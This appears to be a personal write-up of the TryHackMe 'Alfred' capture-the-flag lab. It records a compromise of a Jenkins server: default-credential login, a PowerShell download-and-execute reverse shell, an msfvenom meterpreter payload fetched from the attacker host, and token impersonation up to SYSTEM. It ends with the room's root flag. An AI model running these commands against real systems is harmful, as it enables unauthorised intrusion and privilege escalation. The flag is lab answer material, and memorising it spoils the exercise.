@@ -1,0 +1,125 @@
+# TryHackMe - Alfred
+# tryhackme.com/room/alfred
+# 10.24.20
+# Jenkins service hack simulation
+
+        Task 1
+
+- Run an nmap scan on the $IP
+
+- We see that port 8080 is being used, so in the web browser,
+  pull up $IP:8080
+- We see a login page. Go ahead and google the default password for
+  Jenkins to see if that works. Default is admin:password, in this
+  case it's admin:admin
+- Once in, take a look at the files in use. We've got a "project."
+  Go into there and go to the configure page to check it out.
+- We've been given the hint that we should run a reverse shell attack
+  with a specific path outlined:
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+
+  Edit this to fit the IP addresses and ports needed.
+  Go to the directory that has Invoke-PowerShellTcp.ps1 in it
+  Spin up a python server:
+
+sudo python3 -m http.server 80
+
+  sets up a python server on port 80
+
+  Also set up a netcat listener
+
+nv -nvlp 9001
+
+  Build on the Alfred website and you should see your listener pick up
+  a shell. Your Python server will also show the "GET".
+
+  Now you'll have a shell, find the user.txt in the /bruce/Desktop directory
+
+        Task 2
+
+- You'll be using Metasploit to nail this next part.
+  Generate a payload and name it whatever you want
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.5.178 LPORT=9002 -f exe -o gotcha.exe
+
+  It will include setting up a listener on port 9002 so keep that in mind.
+
+- Set up another python3 server in the alfred folder where you downloaded
+  your payload_name.exe
+
+- run
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.5.178:8000/gotcha.exe','gotcha.exe')"
+
+  on the victim machine. It will download the payload.exe from your system.
+
+- Next set up msfconsole:
+
+msfconsole
+msf5 > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf5 > set LHOST tun0
+LHOST => tun0
+msf5 > set LPORT 9002
+LPORT => 9002
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > run
+
+- This configures the environment to be able to receive the payload once it's
+  run on the victim machine
+- On victim, Start-Process "gotcha.exe"
+- Metasploit intercepts this. Once in msfconsole intercepting, type
+
+/shell
+
+  to operate with windows commands.
+
+whoami /priv
+
+  To see what privileges we have as this user. Let's go ahead and
+  load incognito mode on metasploit.
+
+exit
+load incognito
+
+list_tokens -g
+
+  This shows us a list of the tokens that we can impersonate. We are
+  looking for something with admin privileges. In this case,
+  BUILTIN\Administrators is available
+
+impersonate_token "BUILTIN\Administrators"
+
+  Let it load
+
+getuid
+
+  Next find a system process to migrate to with the correct permissions to
+  stabilize the shell and ensure permissions of a privileged user.
+  You can use services.exe here, PID 668. Try also with spoolsv.exe PID 1224
+
+  Next:
+
+migrate 1224
+
+shell
+whoami
+
+  Result:
+
+nt authority\system
+
+- Next locate the root.txt file
+
+dir root.txt /s
+
+Directory of C:\Windows\system32\config
+
+- cd into that directory and type the file
+
+type root.txt
+
+  Result:
+
+dff0f748678f280250f25a45b8046b4a
